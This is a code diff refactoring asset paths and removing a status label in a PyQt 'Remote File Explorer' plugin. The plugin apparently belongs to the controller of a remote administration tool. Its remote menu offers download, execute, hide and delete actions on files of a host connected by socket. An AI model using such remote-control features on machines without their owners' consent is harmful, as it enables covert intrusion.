@@ -18,21 +18,20 @@ class mainPopup(QWidget, Ui_Form):
         self.sock = args['sock']
         self.socket = args['socket']
         self.ipAddress = args['ipAddress']
-        self.path = os.path.join(os.getcwd(), 'plugins\\mexplorer')
+        self.assets = args['assets']
 
         self.gui = QApplication.processEvents
 
         # hide progressbar
         self.progressBar.setVisible(False)
-        self.statusLabel.setVisible(False)
         self.cancelButton.setVisible(False)
 
         # progress status
         self.activeProgress = False
 
         # init icons
-        self.fileIcon = os.path.join(self.path, 'assets', 'file.png')
-        self.folderIcon = os.path.join(self.path, 'assets', 'folder.png')
+        self.fileIcon = os.path.join(self.assets, 'file.png')
+        self.folderIcon = os.path.join(self.assets, 'folder.png')
 
         self.setWindowTitle('Remote File Explorer on - %s - Socket #%s' % (self.ipAddress, self.socket))
 
@@ -68,14 +67,14 @@ class mainPopup(QWidget, Ui_Form):
 
             # File commands
             if '<FILE>' in _type:
-                self.elMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'upload.png')), 'Upload', self.upload)
+                self.elMenu.addAction(QIcon(os.path.join(self.assets, 'upload.png')), 'Upload', self.upload)
 
             # Folder commands
             elif '<DIR>' in _type:
                 pass
 
             # Global commands
-            self.elMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'remove.png')), 'Remove', self.lRemove)
+            self.elMenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), 'Remove', self.lRemove)
 
             self.elMenu.exec_(self.lexplorerTable.mapToGlobal(point))
 
@@ -89,22 +88,22 @@ class mainPopup(QWidget, Ui_Form):
 
             # File commands
             if '<FILE>' in _type:
-                self.erMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'download.png')), 'Download', self.download)
-                self.erMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'execute.png')), 'Execute', self.rexecuteFile)
+                self.erMenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), 'Download', self.download)
+                self.erMenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), 'Execute', self.rexecuteFile)
 
             # Folder commands
             elif '<DIR>' in _type:
-                self.erMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'open.png')), 'Open Folder', self.ropenFolder)
+                self.erMenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), 'Open Folder', self.ropenFolder)
 
             # Global commands
             self.hiddenMenu = QMenu(self.erMenu)
             self.hiddenMenu.setTitle('Hidden attribute')
-            self.hiddenMenu.setIcon(QIcon(os.path.join(self.path, 'assets', 'hidden.png')))
+            self.hiddenMenu.setIcon(QIcon(os.path.join(self.assets, 'hidden.png')))
             self.erMenu.addMenu(self.hiddenMenu)
-            self.hiddenMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'hidden.png')), 'Hide', self.rHide)
-            self.hiddenMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'unhide.png')), 'Unhide', self.rUnhide)
+            self.hiddenMenu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), 'Hide', self.rHide)
+            self.hiddenMenu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), 'Unhide', self.rUnhide)
             self.erMenu.addSeparator()
-            self.erMenu.addAction(QIcon(os.path.join(self.path, 'assets', 'remove.png')), 'Remove', self.rRemove)
+            self.erMenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), 'Remove', self.rRemove)
 
             self.erMenu.exec_(self.rexplorerTable.mapToGlobal(point))
 
@@ -195,13 +194,10 @@ class mainPopup(QWidget, Ui_Form):
 
                 # Preparing for upload
                 self.progressBar.setVisible(True)
-                self.statusLabel.setVisible(True)
                 self.cancelButton.setVisible(True)
                 self.tempBlockSignals(True)
 
                 self.activeProgress = True
-
-                self.statusLabel.setText('Downloading: %s' % str(_file))
 
                 end = '[ENDOFMESSAGE]'
                 data = ''
@@ -231,7 +227,6 @@ class mainPopup(QWidget, Ui_Form):
                 finally:
                     self.getLocalContent()
                     self.progressBar.setVisible(False)
-                    self.statusLabel.setVisible(False)
                     self.cancelButton.setVisible(False)
                     self.tempBlockSignals(False)
         except AttributeError:
@@ -248,13 +243,10 @@ class mainPopup(QWidget, Ui_Form):
 
                 # Preparing for upload
                 self.progressBar.setVisible(True)
-                self.statusLabel.setVisible(True)
                 self.cancelButton.setVisible(True)
                 self.tempBlockSignals(True)
 
                 self.activeProgress = True
-
-                self.statusLabel.setText('Uploading: %s' % str(_file))
 
                 end = '[ENDOFMESSAGE]'
                 fileSize = os.path.getsize(_file)
@@ -286,7 +278,6 @@ class mainPopup(QWidget, Ui_Form):
                     elif 'downloadError' in result:
                         return False
                 self.progressBar.setVisible(False)
-                self.statusLabel.setVisible(False)
                 self.cancelButton.setVisible(False)
                 self.tempBlockSignals(False)
         except AttributeError:
